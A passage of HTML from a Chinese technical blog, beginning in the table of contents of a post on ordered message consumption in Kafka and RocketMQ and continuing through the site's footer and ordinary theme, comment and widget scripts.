href="#mq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%80%A7%E6%B6%88%E8%B4%B9"><span class="toc-text">mq如何保证消息的顺序性消费</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81Kafka-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E9%A1%BA%E5%BA%8F%E6%80%A7%E6%B6%88%E8%B4%B9"><span class="toc-text">✅ 一、Kafka 如何保证消息顺序性消费</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">🎯 核心原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%AE%A2%E5%8D%95%E7%8A%B6%E6%80%81%E5%8F%98%E6%9B%B4%E6%B6%88%E6%81%AF%E9%A1%BA%E5%BA%8F%E6%B6%88%E8%B4%B9"><span class="toc-text">🧪 示例：订单状态变更消息顺序消费</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%87-Producer-%E4%BB%A3%E7%A0%81%EF%BC%88%E6%8C%87%E5%AE%9A-key%EF%BC%89"><span class="toc-text">👇 Producer 代码（指定 key）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%B3%A8%E6%84%8F%EF%BC%9A-2"><span class="toc-text">📌 注意：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-Kafka-%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E8%AF%9D%E6%9C%AF%EF%BC%9A"><span class="toc-text">✅ Kafka 面试答题话术：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81RocketMQ-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E9%A1%BA%E5%BA%8F%E6%80%A7%E6%B6%88%E8%B4%B9"><span class="toc-text">✅ 二、RocketMQ 如何保证消息顺序性消费</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%EF%BC%9A-2"><span class="toc-text">🎯 核心原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%AE%A2%E5%8D%95%E7%8A%B6%E6%80%81%E6%B6%88%E6%81%AF%E9%A1%BA%E5%BA%8F%E5%8F%91%E9%80%81-%E9%A1%BA%E5%BA%8F%E6%B6%88%E8%B4%B9"><span class="toc-text">🧪 示例：订单状态消息顺序发送 &amp; 顺序消费</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%91%87-Producer-%E9%A1%BA%E5%BA%8F%E5%8F%91%E9%80%81%E7%A4%BA%E4%BE%8B%EF%BC%88%E5%B0%86%E5%90%8C%E4%B8%80%E8%AE%A2%E5%8D%95%E8%B7%AF%E7%94%B1%E5%88%B0%E5%90%8C%E4%B8%80%E4%B8%AA%E9%98%9F%E5%88%97%EF%BC%89"><span class="toc-text">👇 Producer 顺序发送示例（将同一订单路由到同一个队列）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%91%87-Consumer-%E9%A1%BA%E5%BA%8F%E6%B6%88%E8%B4%B9%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">👇 Consumer 顺序消费示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-RocketMQ-%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E8%AF%9D%E6%9C%AF%EF%BC%9A"><span class="toc-text">✅ RocketMQ 面试答题话术：</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><a href="/posts/eec9786.html">魔改指南</a><a href="/box/nav/">网址导航</a></li><li><a href="/social/link/">我的朋友</a><a href="/comments/">留点什么</a></li><li><a href="/personal/about/">关于作者</a><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a><a href="/tags/">文章标签</a></li><li><a href="/box/Gallery/">我的画廊</a><a href="/personal/bb/">我的唠叨</a></li><li><a href="/site/time/">建设进程</a><a href="/site/census/">网站统计</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链⌛</p><div class="ft-img-group"><div class="img-group-item"><a href="https://www.fomal.cc/" title="Fomalhaut🥝"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/60e5d4e39da7c077.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2022-2025</b></span><span><b>&nbsp;&nbsp;By August</b></span></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="右键模式" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="分享链接" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>百度搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>关于博客</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>美化设置</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>切换全屏</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>打印页面</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: '',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: '',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><div class="aplayer" data-id="8492133976" data-server="netease" data-type="playlist"  data-fixed="true" data-theme="#3F51B5"></div><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_3586335_hsivh70x0fm.js"></script><script async src="//at.alicdn.com/t/c/font_3636804_gr02jmjr3y9.js"></script><script async src="//at.alicdn.com/t/c/font_3612150_kfv55xn3u2g.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://www.fomal.cc/categories/演示/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍥 小Fの案例演示笔记 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item" style="visibility: hidden"></div><div class="magnet_item" style="visibility: hidden"></div><a class="magnet_link_more"  href="https://www.fomal.cc/categories/" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
    console.log('已挂载magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
    }
  </script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/2013454d.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://source.fomal.cc/img/default_cover_15.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-08-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/2013454d.html&quot;);" href="javascript:void(0);" alt="">Markdown语法与外挂标签写法汇总</a><div class="blog-slider__text">🥧本文汇总Markdown格式以及外挂标签在网页端的渲染效果，可作为文档进行查询</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/2013454d.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>